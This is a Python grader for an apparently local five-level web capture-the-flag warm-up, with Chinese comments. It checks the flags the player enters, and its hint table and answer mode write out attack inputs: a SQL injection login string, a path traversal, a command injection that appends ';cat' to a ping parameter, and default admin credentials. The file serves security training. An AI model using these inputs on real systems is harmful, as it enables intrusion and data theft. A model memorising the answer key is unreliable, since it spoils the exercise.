#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Web 热身 5 关判分（在本目录跑：python3 check.py）"""
import os
import sys

BASE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "_run")
FLAGS = os.path.join(BASE, "flags")

HINTS = {
    1: "post /login，u=' OR 1=1 --",
    2: "get /download?file=../flags/flag2.txt",
    3: "get /ping?ip=127.0.0.1;cat _run/flags/flag3.txt （先 ;pwd 确认目录）",
    4: "post /admin，admin/admin123",
    5: "robots.txt 说 Disallow: /hidden/ → get /hidden/flag5.txt",
}


def main() -> int:
    if not os.path.isdir(FLAGS):
        sys.exit("没找到 %s —— 先 python3 vulnweb.py 启动一次" % FLAGS)
    exp = {}
    for n in range(1, 6):
        with open(os.path.join(FLAGS, "flag%d.txt" % n), encoding="utf-8") as f:
            exp[n] = f.read().strip()

    if "--answers" in sys.argv:
        for n in range(1, 6):
            print("L%d %-38s # %s" % (n, exp[n], HINTS[n]))
        return 0

    print("Web 5 关 —— 逐关输入 flag（Ctrl+C 退出）\n")
    right = 0
    for n in range(1, 6):
        got = input("L%d 你的 flag: " % n).strip()
        ok = got.lower() == exp[n].lower()
        print("   %s" % ("✅ 对" if ok else "❌ 错，思路: " + HINTS[n]))
        right += ok
    print("\n得分：%d / 5" % right)
    return 0 if right == 5 else 1


if __name__ == "__main__":
    sys.exit(main())
